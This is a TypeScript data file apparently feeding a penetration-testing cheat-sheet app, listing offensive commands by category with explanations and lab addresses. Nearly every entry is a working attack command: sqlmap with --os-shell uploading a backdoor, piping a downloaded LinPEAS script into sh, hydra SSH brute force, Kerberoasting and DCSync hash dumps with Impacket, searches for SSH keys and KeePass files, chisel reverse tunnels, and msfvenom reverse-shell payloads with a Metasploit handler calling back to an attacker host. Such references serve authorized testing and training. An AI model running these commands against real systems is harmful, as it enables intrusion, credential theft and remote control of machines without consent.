export interface CheatSheetCommand {
  id: string;
  category: 'nmap' | 'web' | 'passwords' | 'linux_privesc' | 'windows_privesc' | 'active_directory' | 'pivoting' | 'metasploit';
  command: string;
  description: string;
  flagsExplained?: string;
  targetEnv?: string;
}

export const CHEAT_SHEET_CATEGORIES = [
  { id: 'all', label: 'All Commands' },
  { id: 'nmap', label: 'Nmap & Recon' },
  { id: 'web', label: 'Web Exploitation (ffuf, sqlmap)' },
  { id: 'passwords', label: 'Password Cracking (hashcat, hydra)' },
  { id: 'linux_privesc', label: 'Linux PrivEsc' },
  { id: 'windows_privesc', label: 'Windows PrivEsc' },
  { id: 'active_directory', label: 'Active Directory (Impacket, BloodHound)' },
  { id: 'pivoting', label: 'Pivoting & Port Forwarding' },
  { id: 'metasploit', label: 'Metasploit & MSFvenom' },
];

export const CHEAT_SHEET_COMMANDS: CheatSheetCommand[] = [
  // NMAP
  {
    id: 'nmap-1',
    category: 'nmap',
    command: 'nmap -sC -sV -p- -T4 -v 192.168.56.102',
    description: 'Comprehensive TCP scan: all 65,535 ports, default safe scripts (-sC), service banners (-sV).',
    flagsExplained: '-sC (default scripts), -sV (version detection), -p- (all ports), -T4 (aggressive timing), -v (verbose).',
  },
  {
    id: 'nmap-2',
    category: 'nmap',
    command: 'nmap -sU --top-ports 100 -T4 192.168.56.102',
    description: 'Fast UDP port scan targeting the top 100 most common UDP ports (DNS, SNMP, NTP, TFTP).',
    flagsExplained: '-sU (UDP scan), --top-ports 100 (limits to most frequent targets).',
  },
  {
    id: 'nmap-3',
    category: 'nmap',
    command: 'nmap --script "vuln and safe" -p 80,443,445 192.168.56.102',
    description: 'Run non-destructive NSE vulnerability auditing scripts against web and SMB ports.',
    flagsExplained: '--script "vuln and safe" prevents denial-of-service NSE crashes on sensitive targets.',
  },
  {
    id: 'nmap-4',
    category: 'nmap',
    command: 'nmap -Pn -sS -p 80,443 --min-rate 1000 10.10.10.0/24',
    description: 'Subnet sweep without ICMP discovery probes; bypasses host firewalls dropping ping.',
    flagsExplained: '-Pn (skip discovery), -sS (SYN stealth scan), --min-rate 1000 (minimum packets/sec).',
  },

  // WEB
  {
    id: 'web-1',
    category: 'web',
    command: 'ffuf -u http://192.168.56.103/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -c',
    description: 'Fast asynchronous directory brute-forcing with colorized HTTP status code filtering.',
    flagsExplained: '-u (target URL with FUZZ keyword), -w (wordlist), -mc (match status codes), -c (color).',
  },
  {
    id: 'web-2',
    category: 'web',
    command: 'ffuf -u http://TARGET.com/ -H "Host: FUZZ.TARGET.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234',
    description: 'Virtual Host (VHost) subdomain brute-forcing filtering out false positives by response size (-fs).',
    flagsExplained: '-H (custom Host header), -fs (filter response size in bytes).',
  },
  {
    id: 'web-3',
    category: 'web',
    command: 'sqlmap -u "http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc; security=low" --dbs --batch',
    description: 'Automated SQL injection audit: extracts available database names in non-interactive batch mode.',
    flagsExplained: '--cookie (authenticated session), --dbs (enumerate DBs), --batch (accept default answers).',
  },
  {
    id: 'web-4',
    category: 'web',
    command: 'sqlmap -u "http://192.168.56.103/page.php?id=1" --os-shell',
    description: 'Spawns an interactive operating system command shell using SQL injection (via stacked queries or INTO OUTFILE).',
    flagsExplained: '--os-shell automatically uploads a backdoor PHP/ASP shell to webroot.',
  },
  {
    id: 'web-5',
    category: 'web',
    command: 'nikto -h http://192.168.56.103 -Tuning 1,2,3,b',
    description: 'Web server security scanner targeting server info, misconfigurations, and outdated components.',
  },

  // PASSWORDS
  {
    id: 'pass-1',
    category: 'passwords',
    command: 'hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O',
    description: 'Crack NTLM hashes (Active Directory / Windows SAM) using rockyou.txt wordlist and optimized kernels.',
    flagsExplained: '-m 1000 (NTLM mode), -a 0 (straight dictionary attack), -O (optimized GPU kernel).',
  },
  {
    id: 'pass-2',
    category: 'passwords',
    command: 'hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt',
    description: 'Crack Kerberos 5 TGS-REP etype 23 tickets obtained from Kerberoasting service accounts.',
    flagsExplained: '-m 13100 (Kerberoast SPN ticket mode).',
  },
  {
    id: 'pass-3',
    category: 'passwords',
    command: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.102 ssh -t 4',
    description: 'Network brute-force against SSH daemon using custom username list and 4 concurrent tasks.',
    flagsExplained: '-L (user list), -P (password list), -t 4 (throttle concurrent threads to prevent lockout).',
  },
  {
    id: 'pass-4',
    category: 'passwords',
    command: 'john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt shadow_dump.txt',
    description: 'Crack Linux /etc/shadow passwords hashed with SHA-512 crypt ($6$).',
  },

  // LINUX PRIVESC
  {
    id: 'lpriv-1',
    category: 'linux_privesc',
    command: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;',
    description: 'Enumerate all SUID binaries on the filesystem that execute with root permissions.',
  },
  {
    id: 'lpriv-2',
    category: 'linux_privesc',
    command: 'sudo -l',
    description: 'List user privileges and commands permissible under sudo without root password.',
  },
  {
    id: 'lpriv-3',
    category: 'linux_privesc',
    command: 'cat /etc/crontab; ls -la /etc/cron.*',
    description: 'Inspect system cron jobs for writable scripts or missing absolute binary paths.',
  },
  {
    id: 'lpriv-4',
    category: 'linux_privesc',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    description: 'Download and execute LinPEAS memory-based automated Linux privilege escalation scanner.',
  },

  // WINDOWS PRIVESC
  {
    id: 'wpriv-1',
    category: 'windows_privesc',
    command: 'whoami /priv; whoami /groups',
    description: 'Check active Windows user token privileges (look for SeImpersonatePrivilege, SeBackupPrivilege).',
  },
  {
    id: 'wpriv-2',
    category: 'windows_privesc',
    command: 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\"',
    description: 'Detect Unquoted Service Paths in non-system directories for DLL hijacking.',
  },
  {
    id: 'wpriv-3',
    category: 'windows_privesc',
    command: 'powershell -c "Get-ChildItem -Path C:\\ -Include *.kdbx,*.vmdk,id_rsa,unattend.xml -File -Recurse -ErrorAction SilentlyContinue"',
    description: 'Recursively search drive for stored administrative credentials, SSH keys, or KeePass databases.',
  },

  // ACTIVE DIRECTORY
  {
    id: 'ad-1',
    category: 'active_directory',
    command: 'crackmapexec smb 192.168.56.200 -u "guest" -p "" --shares',
    description: 'Enumerate SMB network shares on Active Directory Domain Controller via anonymous/null session.',
  },
  {
    id: 'ad-2',
    category: 'active_directory',
    command: 'python3 GetUserSPNs.py corp.local/john:Password123 -dc-ip 192.168.56.200 -request',
    description: 'Perform Kerberoasting: request TGS service tickets for accounts with registered SPNs.',
  },
  {
    id: 'ad-3',
    category: 'active_directory',
    command: 'python3 secretsdump.py corp.local/administrator:Pass@123@192.168.56.200 -just-dc-ntlm',
    description: 'Dump NTDS.dit hashes from Domain Controller (DCSync attack) via DRSUAPI protocol.',
  },
  {
    id: 'ad-4',
    category: 'active_directory',
    command: 'bloodhound-python -d corp.local -u "john" -p "Password123" -ns 192.168.56.200 -c All',
    description: 'Gather domain relationship graph data (computers, sessions, groups, ACLs) for BloodHound ingest.',
  },

  // PIVOTING
  {
    id: 'piv-1',
    category: 'pivoting',
    command: 'ssh -N -D 1080 user@192.168.56.102',
    description: 'Establish Dynamic SOCKS5 Proxy over SSH; route proxychains through 127.0.0.1:1080.',
  },
  {
    id: 'piv-2',
    category: 'pivoting',
    command: 'ssh -N -L 8080:10.0.0.50:80 user@192.168.56.102',
    description: 'Local port forwarding: maps localhost:8080 to unreachable internal target 10.0.0.50:80.',
  },
  {
    id: 'piv-3',
    category: 'pivoting',
    command: './chisel server -p 8000 --reverse',
    description: 'Start reverse Chisel proxy server on attacker machine listening on TCP 8000.',
  },
  {
    id: 'piv-4',
    category: 'pivoting',
    command: './chisel client 192.168.56.101:8000 R:socks',
    description: 'Connect back from compromised internal machine to spawn a reverse SOCKS5 tunnel.',
  },

  // METASPLOIT & MSFVENOM
  {
    id: 'msf-1',
    category: 'metasploit',
    command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o shell.elf',
    description: 'Generate standalone x64 Linux executable reverse shell payload with MSFvenom.',
  },
  {
    id: 'msf-2',
    category: 'metasploit',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o payload.exe',
    description: 'Generate staged Windows x64 Meterpreter executable payload.',
  },
  {
    id: 'msf-3',
    category: 'metasploit',
    command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; exploit"',
    description: 'Launch Metasploit directly into multi/handler listener ready to receive callbacks.',
  },
];
